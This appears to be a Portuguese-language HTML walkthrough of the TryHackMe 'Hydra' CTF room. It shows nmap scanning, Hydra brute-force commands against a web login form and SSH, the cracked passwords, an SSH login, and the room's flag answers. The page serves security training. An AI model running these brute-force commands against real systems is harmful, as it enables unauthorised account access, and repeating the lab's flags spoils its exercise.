<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hydra - Walkthrough</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background-color: #f0f8ff;
            color: #333;
            line-height: 1.6;
            padding: 20px;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        
        header {
            text-align: center;
            margin-bottom: 40px;
            padding: 30px;
            background: linear-gradient(135deg, #115192 0%, #0a4b8f 100%);
            border-radius: 12px;
            color: white;
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
        }
        
        h1 {
            font-size: 2.8rem;
            margin-bottom: 15px;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.2);
        }
        
        .subtitle {
            font-size: 1.2rem;
            opacity: 0.9;
        }
        
        h2 {
            color: #115192;
            margin: 35px 0 20px;
            padding-bottom: 10px;
            border-bottom: 2px solid #115192;
        }
        
        h3 {
            color: #0a4b8f;
            margin: 15px 0 10px;
        }
        
        p {
            margin-bottom: 15px;
        }
        
        .intro {
            background-color: white;
            padding: 25px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.08);
            margin-bottom: 40px;
            line-height: 1.8;
        }
        
        .cards-container {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        
        .card {
            background: linear-gradient(145deg, #ffffff, #f5f9ff);
            border-radius: 12px;
            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
            padding: 25px;
            transition: all 0.3s ease;
            border-top: 5px solid #115192;
            position: relative;
            overflow: hidden;
        }
        
        .card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 4px;
            background: linear-gradient(90deg, #115192, #0a4b8f);
        }
        
        .card:hover {
            transform: translateY(-8px);
            box-shadow: 0 12px 20px rgba(0, 0, 0, 0.15);
        }
        
        .card-header {
            display: flex;
            align-items: center;
            margin-bottom: 15px;
        }
        
        .card-icon {
            width: 50px;
            height: 50px;
            background: linear-gradient(135deg, #115192, #0a4b8f);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 15px;
            color: white;
            font-size: 1.5rem;
        }
        
        .card h3 {
            color: #115192;
            margin: 0;
            font-size: 1.4rem;
        }
        
        .card-content {
            color: #444;
            line-height: 1.6;
        }
        
        .highlight {
            background-color: #e8f4ff;
            padding: 12px 15px;
            border-radius: 8px;
            margin: 15px 0;
            border-left: 4px solid #115192;
            font-size: 0.95rem;
        }
        
        .highlight code {
            background: #2d2d2d;
            color: #f8f8f2;
            padding: 2px 6px;
            border-radius: 4px;
            font-family: monospace;
        }
        
        .section {
            background: linear-gradient(to right, #e8f4ff, #f0f8ff);
            padding: 25px;
            border-radius: 12px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.08);
            margin: 40px 0;
            border-left: 5px solid #115192;
        }
        
        .code {
            background-color: #2d2d2d;
            color: #f8f8f2;
            padding: 18px;
            border-radius: 8px;
            margin: 20px 0;
            overflow-x: auto;
            font-family: 'Fira Code', monospace;
            font-size: 0.95rem;
            line-height: 1.5;
            border-left: 4px solid #115192;
        }
        
        .command {
            background-color: #2d2d2d;
            color: #f8f8f2;
            padding: 12px 15px;
            border-radius: 6px;
            margin: 10px 0;
            font-family: 'Fira Code', monospace;
            font-size: 0.95rem;
            display: flex;
            align-items: center;
        }
        
        .command-prefix {
            color: #50fa7b;
            margin-right: 10px;
        }
        
        .example-link {
            display: inline-block;
            background: #115192;
            color: white;
            padding: 10px 20px;
            border-radius: 6px;
            text-decoration: none;
            margin: 10px 0;
            transition: background 0.3s;
        }
        
        .example-link:hover {
            background: #0a4b8f;
        }
        
        footer {
            text-align: center;
            margin-top: 50px;
            padding: 25px;
            color: #666;
            font-size: 0.95rem;
            border-top: 1px solid #ddd;
        }
        
        ul, ol {
            margin-left: 20px;
            margin-bottom: 15px;
        }
        
        li {
            margin-bottom: 8px;
        }
        
        .image-container {
            width: 100%;
            margin: 20px 0;
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            border: 2px solid #115192;
        }
        
        .image-container img {
            width: 100%;
            display: block;
            transition: transform 0.3s ease;
        }
        
        .image-container:hover img {
            transform: scale(1.02);
        }
        
        .image-caption {
            background: #115192;
            color: white;
            padding: 10px;
            text-align: center;
            font-size: 0.9rem;
        }
        
        .step {
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            margin: 20px 0;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }
        
        .step-number {
            background-color: #115192;
            color: white;
            width: 40px;
            height: 40px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            margin-right: 15px;
        }
        
        .step-header {
            display: flex;
            align-items: center;
            margin-bottom: 15px;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
            background-color: white;
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }
        
        th, td {
            padding: 12px 15px;
            text-align: left;
            border-bottom: 1px solid #ddd;
        }
        
        th {
            background-color: #115192;
            color: white;
        }
        
        tr:hover {
            background-color: #f5f9ff;
        }
        
        @media (max-width: 768px) {
            .cards-container {
                grid-template-columns: 1fr;
            }
            
            header {
                padding: 20px;
            }
            
            h1 {
                font-size: 2.2rem;
            }
            
            .image-container {
                margin: 15px 0;
            }
        }
    </style>
</head>
<body>
    <a href="../CTF.php"><?php include('../seta.php'); ?></a>
    <div class="container">
        <header>
            <h1>HYDRA</h1>
            <p class="subtitle">Walkthrough da sala do TryHackMe</p>
        </header>
        
        <section class="intro">
            <h2>Sala Hydra</h2>
            <p>Esta é uma sala de CTF (Capture The Flag) do TryHackMe focada em ataques de força bruta usando a ferramenta Hydra. O objetivo é explorar vulnerabilidades de autenticação e encontrar flags escondidas.</p>
            
            <a href="https://tryhackme.com/room/hydra" target="_blank" class="example-link">
                <i class="fas fa-external-link-alt"></i> Acessar Sala no TryHackMe
            </a>
            
            <div class="highlight">
                <strong>Nota:</strong> Esta sala ensina como usar o Hydra para realizar ataques de força bruta em serviços HTTP e SSH.
            </div>
        </section>
        
        <section class="section">
            <h2>Reconhecimento Inicial</h2>
            
            <div class="step">
                <div class="step-header">
                    <div class="step-number">1</div>
                    <h3>Escaneamento de Portas</h3>
                </div>
                <p>Primeiro, realize um escaneamento de portas para identificar serviços disponíveis:</p>
                <div class="code">
                    nmap -sV 10.201.56.232
                </div>
                
                <div class="highlight">
                    <strong>Resultado do escaneamento:</strong>
                    <ul>
                        <li>Porta 22/tcp: SSH - OpenSSH 8.2p1 Ubuntu</li>
                        <li>Porta 80/tcp: HTTP - Node.js Express framework</li>
                    </ul>
                </div>
                
                <p>O resultado mostra dois serviços principais: SSH na porta 22 e um servidor web Node.js na porta 80.</p>
            </div>
            
            <div class="step">
                <div class="step-header">
                    <div class="step-number">2</div>
                    <h3>Investigando o Serviço Web</h3>
                </div>
                <p>Ao acessar o serviço web na porta 80, encontramos uma página de login:</p>
                
                <div class="highlight">
                    <strong>Página de login:</strong> A página exibe a mensagem "Your username or password is incorrect." quando credenciais inválidas são fornecidas.
                </div>
                
                <p>Esta mensagem de erro será importante para configurar nosso ataque de força bruta com o Hydra.</p>
            </div>
        </section>
        
        <section class="section">
            <h2>Ataque de Força Bruta com Hydra</h2>
            
            <div class="step">
                <div class="step-header">
                    <div class="step-number">3</div>
                    <h3>Preparando o Ataque ao HTTP POST</h3>
                </div>
                <p>Para realizar um ataque de força bruta no formulário de login, precisamos identificar:</p>
                <ol>
                    <li>URL do endpoint de login</li>
                    <li>Parâmetros do formulário</li>
                    <li>Mensagem de erro para detectar tentativas falhas</li>
                </ol>
                
                <div class="code">
                    # Sintaxe do Hydra para ataques HTTP POST
                    hydra -l [username] -P [wordlist] [IP] http-post-form "[path]:[parameters]:[error message]"
                </div>
                
                <p>Com base na análise, identificamos:</p>
                <ul>
                    <li>URL: <code>/login</code></li>
                    <li>Parâmetros: <code>username=^USER^&password=^PASS^</code></li>
                    <li>Mensagem de erro: <code>Your username or password is incorrect.</code></li>
                </ul>
            </div>
            
            <div class="step">
                <div class="step-header">
                    <div class="step-number">4</div>
                    <h3>Executando o Ataque ao HTTP</h3>
                </div>
                <p>Usando o Hydra com a wordlist rockyou.txt para encontrar credenciais válidas:</p>
                
                <div class="code">
                    hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.201.56.232 http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect."
                </div>
                
                <div class="highlight">
                    <strong>Resultado do ataque:</strong>
                    <ul>
                        <li>Login bem-sucedido encontrado!</li>
                        <li>Usuário: molly</li>
                        <li>Senha: sunshine</li>
                    </ul>
                </div>
                
                <p>O Hydra encontrou a senha "sunshine" para o usuário "molly" em aproximadamente 17 segundos.</p>
                
                <div class="highlight">
                    <strong>Primeira flag encontrada:</strong> THM{2673a7dd116de68e85c48ec0b1f2612e}
                </div>
            </div>
            
            <div class="step">
                <div class="step-header">
                    <div class="step-number">5</div>
                    <h3>Ataque ao Serviço SSH</h3>
                </div>
                <p>Com as credenciais descobertas, podemos tentar um ataque similar no serviço SSH:</p>
                
                <div class="code">
                    hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.201.56.232 ssh
                </div>
                
                <div class="highlight">
                    <strong>Resultado do ataque SSH:</strong>
                    <ul>
                        <li>Login bem-sucedido encontrado!</li>
                        <li>Usuário: molly</li>
                        <li>Senha: butterfly</li>
                    </ul>
                </div>
                
                <p>O Hydra encontrou uma senha diferente ("butterfly") para o mesmo usuário no serviço SSH.</p>
            </div>
        </section>
        
        <section class="section">
            <h2>Exploração e Obtenção da Flag Final</h2>
            
            <div class="step">
                <div class="step-header">
                    <div class="step-number">6</div>
                    <h3>Acesso SSH</h3>
                </div>
                <p>Use as credenciais descobertas para acessar o servidor via SSH:</p>
                
                <div class="code">
                    ssh molly@10.201.56.232
                </div>
                
                <p>Senha: butterfly</p>
                
                <div class="highlight">
                    <strong>Conexão bem-sucedida:</strong> Acesso concedido ao sistema Ubuntu.
                </div>
            </div>
            
            <div class="step">
                <div class="step-header">
                    <div class="step-number">7</div>
                    <h3>Obtenção da Flag Final</h3>
                </div>
                <p>Após o acesso SSH, liste os arquivos no diretório home do usuário e leia a flag:</p>
                
                <div class="code">
                    molly@ip-10-201-56-232:~$ ls
                    flag2.txt
                    molly@ip-10-201-56-232:~$ cat flag2.txt
                    THM{c8eeb0468febbadea859baeb33b2541b}
                </div>
                
                <div class="highlight">
                    <strong>Flag final encontrada:</strong> THM{c8eeb0468febbadea859baeb33b2541b}
                </div>
            </div>
        </section>
        
        <section class="section">
            <h2>Comandos e Técnicas Utilizadas</h2>
            
            <table>
                <tr>
                    <th>Comando/Técnica</th>
                    <th>Descrição</th>
                    <th>Propósito</th>
                </tr>
                <tr>
                    <td><code>nmap -sV</code></td>
                    <td>Escaneamento de versões de serviços</td>
                    <td>Identificar serviços e versões em execução</td>
                </tr>
                <tr>
                    <td><code>hydra http-post-form</code></td>
                    <td>Ataque de força bruta em formulários HTTP POST</td>
                    <td>Quebrar autenticação web</td>
                </tr>
                <tr>
                    <td><code>hydra ssh</code></td>
                    <td>Ataque de força bruta em serviço SSH</td>
                    <td>Quebrar autenticação SSH</td>
                </tr>
                <tr>
                    <td><code>ssh</code></td>
                    <td>Conexão segura a shell remoto</td>
                    <td>Acessar sistema comprometido</td>
                </tr>
            </table>
        </section>
        
        <section class="section">
            <h2>Resumo da Exploração</h2>
            
            <div class="cards-container">
                <div class="card">
                    <div class="card-header">
                        <div class="card-icon">
                            <i class="fas fa-search"></i>
                        </div>
                        <h3>Reconhecimento</h3>
                    </div>
                    <div class="card-content">
                        <p>Escaneamento de portas revelou serviços HTTP (Node.js) e SSH em execução.</p>
                    </div>
                </div>
                
                <div class="card">
                    <div class="card-header">
                        <div class="card-icon">
                            <i class="fas fa-bomb"></i>
                        </div>
                        <h3>Força Bruta</h3>
                    </div>
                    <div class="card-content">
                        <p>Hydra foi usado para quebrar a autenticação tanto no serviço web quanto no SSH.</p>
                    </div>
                </div>
                
                <div class="card">
                    <div class="card-header">
                        <div class="card-icon">
                            <i class="fas fa-key"></i>
                        </div>
                        <h3>Exploração</h3>
                    </div>
                    <div class="card-content">
                        <p>Acesso via SSH com credenciais descobertas permitiu capturar a flag final.</p>
                    </div>
                </div>
            </div>
            
            <div class="highlight">
                <strong>Lição aprendida:</strong> Esta sala demonstra a importância de usar senhas fortes e únicas para diferentes serviços, já que o usuário "molly" tinha senhas diferentes para o serviço web ("sunshine") e SSH ("butterfly").
            </div>
        </section>
        
        <footer>
            <p>Walkthrough da sala Hydra do TryHackMe </p>
        </footer>
    </div>
</body>
</html>